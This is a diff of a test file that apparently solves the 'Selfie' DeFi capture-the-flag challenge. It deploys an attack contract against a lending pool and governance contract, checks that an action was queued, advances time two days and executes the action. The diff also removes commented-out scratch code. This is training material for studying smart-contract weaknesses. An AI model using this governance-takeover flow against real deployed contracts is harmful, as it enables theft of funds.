@@ -46,42 +46,19 @@ describe('[Challenge] Selfie', function () {
       await ethers.getContractFactory('AttackSelfie', deployer)
     ).deploy(pool.address, token.address, governance.address)
 
-    const tx = await attack.connect(player).start()
+    const tx = await attack.connect(player).start(player.address)
     await tx.wait()
 
-    const events = await governance.queryFilter(
+    // Verify that the action is queued by checking the event
+    const eventActionQueued = await governance.queryFilter(
       governance.filters.ActionQueued(null, null)
     )
+    expect(eventActionQueued.length).to.equal(1)
 
-    expect(events.length).to.equal(1)
+    //We advance 2 days in order to execute our proposal:
+    await time.increase(3600 * 24 * 2)
 
-    /*// Perform some action that should emit the event
-  const transaction = await contract.someFunction();
-
-  // Wait for the transaction to be mined
-  await transaction.wait();
-
-  // Access the emitted events
-  const events = await contract.queryFilter(contract.filters.EventName());
-
-  // Check if the event was emitted
-  expect(events.length).to.equal(1);*/
-
-    /*  
-    const result = await attack
-      .connect(player)
-      .start()
-      .then((tx) => {
-        console.log(tx)
-        attack.on('ActionQueued', (actionID, sender) => {
-          console.log(actionID, sender)
-        })
-      })
-      .catch((error) => {
-        console.error(error)
-      })
-
-    */
+    await governance.executeAction(1)
   })
 
   after(async function () {
